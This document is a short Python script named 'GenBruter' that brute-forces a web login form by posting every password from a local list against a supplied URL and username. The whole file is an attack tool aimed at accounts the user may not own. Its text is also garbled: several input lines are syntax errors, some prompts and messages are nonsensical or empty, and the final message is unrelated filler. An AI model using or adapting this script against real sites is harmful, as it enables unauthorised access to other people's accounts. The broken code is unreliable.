import requests
import re
import os

#github : @14mb1v45h
logo = """
  /$$$$$$                      /$$$$$$$                        /$$                        
 /$$__  $$                    | $$__  $$                      | $$                        
| $$  \__/  /$$$$$$  /$$$$$$$ | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$   /$$$$$$ 
| $$ /$$$$ /$$__  $$| $$__  $$| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$ /$$__  $$
| $$|_  $$| $$$$$$$$| $$  \ $$| $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/| $$  | $$| $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/| $$      
|  $$$$$$/|  $$$$$$$| $$  | $$| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$      
 \______/  \_______/|__/  |__/|_______/ |__/       \______/    \___/   \_______/|__/      
                                                                                                                                                                              
"""

# github : @14mb1v45h
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo.center(os.get_terminal_size().columns))

# github : @14mb1v45h
def get_input(prompt):
    value = input(prompt)
    while not value.strip():
        print("input")
        value = input(prompt)
    return value

# github : @14mb1v45h
def validate_url(url):
    # github : @14mb1v45h
    url_pattern = re.compile(
        r'^(https?://)?'  #
        r'([a-zA-Z0-9.-]+)'  # 
        r'(\.[a-zA-Z]{2,6})'  #
        r'(:\d+)?'  # 
        r'(\/.*)?$'  # 
    )
    return url_pattern.match(url)


clear_screen()


print("GenBruter!")
print("in progress.")
print()


while True:
    target_url = get_input("url (login, https://example.com/login) >>>   ")
    if validate_url(target_url):
        break
    else:
        print("printing URL.")
print()

#
username = get_input("See the story (nearly, the story)") >>>   ")
print()

#
negative_response = get_input("") >>>   ")
print()

# 
try:
    with open('passwords.txt', 'r') as file:
        password_list = file.readlines()
except FileNotFoundError:
    print("")
    exit()



session = requests.Session()


initial_response = session.get(target_url)
initial_content = initial_response.content.decode()
initial_headers = initial_response.headers
initial_status = initial_response.status_code

# 
for entry in password_list:
    current_password = entry.strip()
    response = session.post(target_url, data={'username': username, 'password': current_password}) 
    response_content = response.content.decode()  
    response_headers = response.headers
    response_status = response.status_code
    if (negative_response in response_content or
        response_content == initial_content or
        response_status != initial_status or
        response_headers != initial_headers): 
        print(f"")
    else:
        print(f"passwd '{current_password}' username {username}!")
        break  
    print("Let's see what happened. Let's talk about it.")
